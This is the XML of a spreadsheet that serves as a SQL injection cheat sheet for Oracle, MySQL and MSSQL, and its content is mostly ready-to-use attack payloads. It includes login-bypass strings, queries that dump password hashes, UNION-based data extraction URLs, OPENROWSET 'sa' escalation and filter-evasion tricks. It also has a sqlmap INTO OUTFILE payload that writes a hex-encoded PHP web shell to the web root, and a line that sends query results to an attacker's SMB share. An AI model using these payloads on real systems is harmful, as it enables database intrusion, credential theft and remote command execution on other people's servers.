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6.7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120.76pt" fo:break-before="auto" style:use-optimal-row-height="false"/>
    </style:style>
    <style:style style:name="ro9" style:family="table-row">
      <style:table-row-properties style:row-height="137.25pt" fo:break-before="auto" style:use-optimal-row-height="false"/>
    </style:style>
    <style:style style:name="ro10" style:family="table-row">
      <style:table-row-properties style:row-height="19.7pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro11" style:family="table-row">
      <style:table-row-properties style:row-height="142.5pt" fo:break-before="auto" style:use-optimal-row-height="false"/>
    </style:style>
    <style:style style:name="ro12" style:family="table-row">
      <style:table-row-properties style:row-height="91.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro13" style:family="table-row">
      <style:table-row-properties style:row-height="114.01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327.74pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro16" style:family="table-row">
      <style:table-row-properties style:row-height="80.25pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro17" style:family="table-row">
      <style:table-row-properties style:row-height="125.26pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro18" style:family="table-row">
      <style:table-row-properties style:row-height="69pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro19" style:family="table-row">
      <style:table-row-properties style:row-height="136.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro20" style:family="table-row">
      <style:table-row-properties style:row-height="192.76pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro21" style:family="table-row">
      <style:table-row-properties style:row-height="215.26pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro22" style:family="table-row">
      <style:table-row-properties style:row-height="147.74pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro23" style:family="table-row">
      <style:table-row-properties style:row-height="13.41pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro24" style:family="table-row">
      <style:table-row-properties style:row-height="260.25pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro25" style:family="table-row">
      <style:table-row-properties style:row-height="181.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro26" style:family="table-row">
      <style:table-row-properties style:row-height="170.25pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro27" style:family="table-row">
      <style:table-row-properties style:row-height="204.01pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro28" style:family="table-row">
      <style:table-row-properties style:row-height="37.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro29" style:family="table-row">
      <style:table-row-properties style:row-height="28.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro30" style:family="table-row">
      <style:table-row-properties style:row-height="19.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro31" style:family="table-row">
      <style:table-row-properties style:row-height="64.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro32" style:family="table-row">
      <style:table-row-properties style:row-height="82.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro33"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Liberation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1" table:number-rows-repeated="2">
          <table:table-cell/>
          <table:table-cell table:style-name="Default"/>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3">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
            <text:p><text:span text:style-name="T2">?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2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>7 – Queries Only</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro3">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3">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text:p>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4">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3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Password Hashes (priv)</text:p>
            <text:p>&lt;= 10g.  astatus tells you if acct is locked</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT username FROM all_users;</text:p>
            <text:p>SELECT name, password, astatus FROM sys.user$ --priv &lt;= 10g</text:p>
            <text:p>SELECT name,spare4 FROM sys.user$ --priv &lt;= 11g</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">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6">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4">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4">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1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Find columns from table name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT column_name FROM all_tab_columns WHERE table_name = 'Users';</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">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4">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4">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Concat</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT ‘A’ || ‘B’ FROM dual; — returns AB</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">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4">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4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Avoiding quotes</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT 0x09120911091 FROM dual;</text:p>
            <text:p>SELECT chr(65) || chr(66) FROM dual; — returns AB</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">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4">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4">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6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Hostname, IP Address</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT UTL_INADDR.get_host_name FROM dual;</text:p>
            <text:p>SELECT host_name FROM v$instance; --priv</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7">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Default/System Databases</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SYSTEM</text:p>
            <text:p>SYSAUX</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro8">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able:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Oracle system tables continued</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T3">DATABASE_COMPATIBLE_LEVEL</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_DB_LINKS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_ERRORS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_OBJECTS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_ROLES</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_ROLE_PRIVS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_SOURCE</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_TABLESPACES</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_TAB_PRIVS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_TRIGGERS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_TS_QUOTAS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_USERS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DBA_VIEWS</text:span></text:p>
            <text:p><text:span text:style-name="T3">DICTIONARY</text:span></text:p>
            <text:p><text:span text:style-name="T3">DICT_COLUMNS</text:span></text:p>
            <text:p><text:span text:style-name="T3">GLOBAL_NAME</text:span></text:p>
            <text:p><text:span text:style-name="T3">NLS_DATABSE_PARAMETERS</text:span></text:p>
            <text:p><text:span text:style-name="T3">NLS_INSTANCE_PARAMETERS</text:span></text:p>
            <text:p><text:span text:style-name="T3">NLS_SESSION_PARAMETERS</text:span></text:p>
            <text:p><text:span text:style-name="T3">PRODUCT_COMPONENT_VERSION</text:span></text:p>
            <text:p><text:span text:style-name="T3">ROLE_TAB_PRIVS</text:span></text:p>
            <text:p><text:span text:style-name="T3">SESSION_PRIVS</text:span></text:p>
            <text:p><text:span text:style-name="T3">SESSION_ROLES</text:span></text:p>
            <text:p><text:span text:style-name="T3">SYSTEM_PRIVILEGE_MAP</text:span></text:p>
            <text:p><text:span text:style-name="T3">TABLE_PRIVILEGES</text:span></text:p>
            <text:p><text:span text:style-name="T3">TABLE_PRIVILEGE_MAP</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">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number-rows-repeated="1048459">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2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>1 – Standard SQL injection (not blind)</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>1.1 – Information gathering</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro11">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2">-’</text:span></text:p>
            <text:p><text:span text:style-name="T2">' ‘</text:span></text:p>
            <text:p><text:span text:style-name="T2">'&amp;’</text:span></text:p>
            <text:p><text:span text:style-name="T2">'^’</text:span></text:p>
            <text:p><text:span text:style-name="T2">'*’</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR ‘’-’</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR ‘--’</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR ‘’ ‘</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR ‘’&amp;’</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR ‘’^’</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR ‘’*’</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR '1</text:span></text:p>
            <text:p>' OR 1=’1</text:p>
            <text:p>' OR ‘1’=’1</text:p>
            <text:p>' OR ‘1=1</text:p>
            <text:p><text:span text:style-name="T2">' OR 1=1 #</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR 1=1 –</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR 1 -- -</text:span></text:p>
            <text:p><text:span text:style-name="T2">') OR ('x'='x</text:span></text:p>
            <text:p><text:span text:style-name="T2">') OR (‘x’)=(‘x</text:span></text:p>
            <text:p><text:span text:style-name="T2">')) OR ((‘x’))=((‘x</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR username LIKE '%admin%</text:span></text:p>
            <text:p><text:span text:style-name="T2">a' OR 1=1 --</text:span></text:p>
            <text:p><text:span text:style-name="T2">1’ OR 1=1 –</text:span></text:p>
            <text:p><text:span text:style-name="T2">'='</text:span></text:p>
            <text:p><text:span text:style-name="T2">'LIKE'</text:span></text:p>
            <text:p><text:span text:style-name="T2">'=0--+</text:span></text:p>
            <text:p><text:span text:style-name="T2">' OR true--</text:span></text:p>
            <text:p><text:span text:style-name="T2">') OR true--</text:span></text:p>
            <text:p><text:span text:style-name="T2">“ OR “”-”</text:span></text:p>
            <text:p><text:span text:style-name="T2">“ OR “”--”</text:span></text:p>
            <text:p><text:span text:style-name="T2">“ OR “”&amp;”</text:span></text:p>
            <text:p><text:span text:style-name="T2">“ OR “”^”</text:span></text:p>
            <text:p><text:span text:style-name="T2">“ OR “”*”</text:span></text:p>
            <text:p><text:span text:style-name="T2">" OR "" = "</text:span></text:p>
            <text:p>" OR 1 = 1 -- -</text:p>
            <text:p><text:span text:style-name="T2">" OR 1=1 #</text:span></text:p>
            <text:p><text:span text:style-name="T2">" OR "x"="x</text:span></text:p>
            <text:p><text:span text:style-name="T2">") OR ("x"="x</text:span></text:p>
            <text:p><text:span text:style-name="T2">“) OR (“x”)=(“x</text:span></text:p>
            <text:p><text:span text:style-name="T2">“)) OR ((“x”))=((“x</text:span></text:p>
            <text:p><text:span text:style-name="T2">“ OR true--</text:span></text:p>
            <text:p><text:span text:style-name="T2">“) OR true--</text:span></text:p>
            <text:p><text:span text:style-name="T2">OR true --</text:span></text:p>
            <text:p><text:span text:style-name="T2">a" OR 1=1 –</text:span></text:p>
            <text:p><text:span text:style-name="T2">1 OR 1=1</text:span></text:p>
            <text:p>OR 1=1 –</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">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3">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4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Check for privs (some require priv)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T3">SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; </text:span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T3">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3">SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; — list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;</text:span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T3">SELECT file_priv FROM mysql.user WHERE user = 'username';</text:span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T3">SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%';</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">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3">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10">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4">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4">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4">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3">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3">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5">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6">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4">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10">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>1.3 – Dumping the data</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro3">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4">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1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Another UNION select potential</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>UNION ALL (SELECT ‘HELLO!’)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">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6">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3">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7">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3">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3">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4">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5">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5">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Find Tables from Column Name</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T4">SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; </text:span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T4">SELECT table_name FROM information_schema.columns WHERE column_name = 'username';</text:span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T4">SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">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3">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4">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4">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10">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>1.4 – Privilege escalation with OPENROWSET</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Default"/>
        </table:table-row>
        <table:table-row table:style-name="ro6">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 from OPENROWSET('SQLOLEDB', ''; 'sa'; 'password', 'select 1')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">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4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Remember the escape character in MSSQL is ” so, if you need some ‘ on the query in the openrowset you need to use them double like:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select name from OPENROWSET('SQLOLEDB', ''; 'sa'; 'password', 'select name from master..sysusers where uid =''0''')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p> </text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>2 – Blind sql injection</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>2.a Feel around</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro5">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4">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6">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3">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10">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>2.b Brute</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro3">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8">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6">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4">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3">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3">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6">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4">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2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>3 – Compatibility issues</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Default"/>
        </table:table-row>
        <table:table-row table:style-name="ro3">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office:value-type="string" calcext:value-type="string">
            <text:p>1' ; use master; select * from OPENROWSET('SQLOLEDB', ''; 'sa'; 'password', 'select 1') --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell table:style-name="ce13"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>4 – Escape errors</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Default"/>
        </table:table-row>
        <table:table-row table:style-name="ro5">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style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>a';SET QUOTED_IDENTIFIER OFF;select * FROM OPENROWSET("SQLOLEDB","";"sa";"password","SELECT 1");--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>5 – MISC and Functions</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro3">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4">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4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>HASH</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>MD5(‘abc’);</text:p>
            <text:p>SHA1(‘abc’);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">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6">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6">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ext:p/>
            <text:p>Sqlmap: OR 9460=9460 LIMIT 0,1 INTO OUTFILE ‘var/www/shell.php’ LINES TERMINATED BY 0x3c3f7068702024633d245f524551554553545b22636d64225d3b407365745f74696d655f6c696d69742830293b4069676e6f72655f757365725f61626f72742831293b40696e695f73657428276d61785f657865637574696f6e5f74696d65272c30293b247a3d40696e695f676574282764697361626c655f66756e6374696f6e7327293b69662821656d70747928247a29297b247a3d707265675f7265706c61636528272f5b2c205d2b2f272c272c272c247a293b247a3d6578706c6f646528272c272c247a293b247a3d61727261795f6d617028277472696d272c247a293b7d656c73657b247a3d617272617928293b7d24633d24632e2220323e26315c6e223b66756e6374696f6e206628246e297b676c6f62616c20247a3b72657475726e2069735f63616c6c61626c6528246e29616e6421696e5f617272617928246e2c247a293b7d69662866282773797374656d2729297b6f625f737461727428293b73797374656d282463293b24773d6f625f6765745f636f6e74656e747328293b6f625f656e645f636c65616e28293b7d656c736569662866282770726f635f6f70656e2729297b24793d70726f635f6f70656e2824632c617272617928617272617928706970652c72292c617272617928706970652c77292c617272617928706970652c7729292c2474293b24773d4e554c4c3b7768696c65282166656f662824745b315d29297b24772e3d66726561642824745b315d2c353132293b7d4070726f635f636c6f7365282479293b7d656c73656966286628277368656c6c5f657865632729297b24773d7368656c6c5f65786563282463293b7d656c736569662866282770617373746872752729297b6f625f737461727428293b7061737374687275282463293b24773d6f625f6765745f636f6e74656e747328293b6f625f656e645f636c65616e28293b7d656c7365696628662827706f70656e2729297b24783d706f70656e2824632c72293b24773d4e554c4c3b69662869735f7265736f7572636528247829297b7768696c65282166656f6628247829297b24772e3d66726561642824782c353132293b7d7d4070636c6f7365282478293b7d656c7365696628662827657865632729297b24773d617272617928293b657865632824632c2477293b24773d6a6f696e28636872283130292c2477292e636872283130293b7d656c73657b24773d303b7d7072696e7420223c7072653e222e24772e223c2f7072653e223b3f3e-- –</text:p>
            <text:p/>
            <text:p>Sqlmap uses a ascii hex payload. Make sure to URL encoded. %3D for =, %27 for ‘, %2C for,, %2F for /</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>LINES TERMINATED BY</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T2"> If you don't specify a LINES clause, the default is the same as if you had written this:</text:span></text:p>
            <text:p><text:span text:style-name="T2"/></text:p>
            <text:p><text:span text:style-name="T2">LINES TERMINATED BY '\n'</text:span></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4">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4">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2">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7">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4">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8">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3">;%00</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">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3">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8">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9">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5">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4">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5">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3">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6">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office:value-type="string" calcext:value-type="string">
            <text:p>Truncating vulnerability</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Check notes, if field is limited in length and truncates values, a vulnerability could exist</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>6 – Older Stuff</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro4">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4">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5">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3">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6">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5">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4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Current DB</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT database()</text:p>
            <text:p>Schema()</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">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4">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3">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3">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4">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8">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requests</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">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9">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able:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro20">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Information_schema tables continued</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T3">PARAMETERS</text:span></text:p>
            <text:p><text:span text:style-name="T3">PARTITIONS</text:span></text:p>
            <text:p><text:span text:style-name="T3">PLUGINS</text:span></text:p>
            <text:p><text:span text:style-name="T3">PROCESSLIST</text:span></text:p>
            <text:p><text:span text:style-name="T3">PROFILING</text:span></text:p>
            <text:p><text:span text:style-name="T3">REFERENTIAL_CONSTRAINTS</text:span></text:p>
            <text:p><text:span text:style-name="T3">ROUTINES</text:span></text:p>
            <text:p><text:span text:style-name="T3">SCHEMATA</text:span></text:p>
            <text:p><text:span text:style-name="T3">SCHEMA_PRIVILEGES</text:span></text:p>
            <text:p><text:span text:style-name="T3">STATISTICS</text:span></text:p>
            <text:p><text:span text:style-name="T3">TABELS</text:span></text:p>
            <text:p><text:span text:style-name="T3">TABLESPACES</text:span></text:p>
            <text:p><text:span text:style-name="T3">TABLE_CONSTRAINTS</text:span></text:p>
            <text:p><text:span text:style-name="T3">TABLE_PRIVILEGES</text:span></text:p>
            <text:p><text:span text:style-name="T3">TRIGGERS</text:span></text:p>
            <text:p><text:span text:style-name="T3">USER_PRIVILEGES</text:span></text:p>
            <text:p><text:span text:style-name="T3">VIEWS</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro20">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
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro21">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mysql table continued</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T3">time_zone</text:span></text:p>
            <text:p><text:span text:style-name="T3">time_zone_leap_second</text:span></text:p>
            <text:p><text:span text:style-name="T3">time_zone_name</text:span></text:p>
            <text:p><text:span text:style-name="T3">time_zone_transition</text:span></text:p>
            <text:p><text:span text:style-name="T3">time_zone_transition_type</text:span></text:p>
            <text:p><text:span text:style-name="T3">gtid_executed</text:span></text:p>
            <text:p><text:span text:style-name="T3">ndb_binlog_index</text:span></text:p>
            <text:p><text:span text:style-name="T3">slave_master_info</text:span></text:p>
            <text:p><text:span text:style-name="T3">slave_relay_log_info</text:span></text:p>
            <text:p><text:span text:style-name="T3">slave_worker_info</text:span></text:p>
            <text:p><text:span text:style-name="T3">innodb_index_stats</text:span></text:p>
            <text:p><text:span text:style-name="T3">innodb_table_stats</text:span></text:p>
            <text:p><text:span text:style-name="T3">server_cost</text:span></text:p>
            <text:p><text:span text:style-name="T3">engine_cost</text:span></text:p>
            <text:p><text:span text:style-name="T3">audit_log_filter</text:span></text:p>
            <text:p><text:span text:style-name="T3">audit_log_user</text:span></text:p>
            <text:p><text:span text:style-name="T3">firewall_users</text:span></text:p>
            <text:p><text:span text:style-name="T3">firewall_whitelist</text:span></text:p>
            <text:p><text:span text:style-name="T3">Servers</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">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6">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3">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2">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3">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3">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4">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4">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3">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8">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4">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4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>String separation / Comment obfuscation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT/*/'a'/*/ 'd'/*/ 'mi'/*/ 'n'</text:p>
            <text:p><text:span text:style-name="T3">1 o/**/r 1=1 A/**/ND user L/**/IKE "%root%"</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">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3">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4">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3">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5">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6">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46">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2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>1 – Standard SQL injection (not blind)</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Integer injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1--</text:p>
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,2--</text:p>
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,2,3--</text:p>
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,2,3,4--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract database user</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,USER,3,4--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract Database name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,DB_NAME,3,4--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract database version</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,@@VERSION,3,4--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract server name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,@@SERVERNAME,3,4--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract database tables</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,name,3,4 from sysobjects where xtype=char(85)--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract table name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 and 1=2 UNION SELECT 11,22,33,table_name from information_schema.tables--</text:p>
            <text:p>1 and 1=2 UNION SELECT 11,22,33,table_name from information_schema.tables where table_name not in ('threads')--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract table column names</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,column_name,3,4 from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'--</text:p>
            <text:p>1 and 1=2 UNION SELECT 11,22,33,column_name from information_schema.columns where table_name='users'--</text:p>
            <text:p>1 and 1=2 UNION SELECT 11,22,33,column_name from information_schema.columns where table_name='users' and column_name not in ('uname')--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> field</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
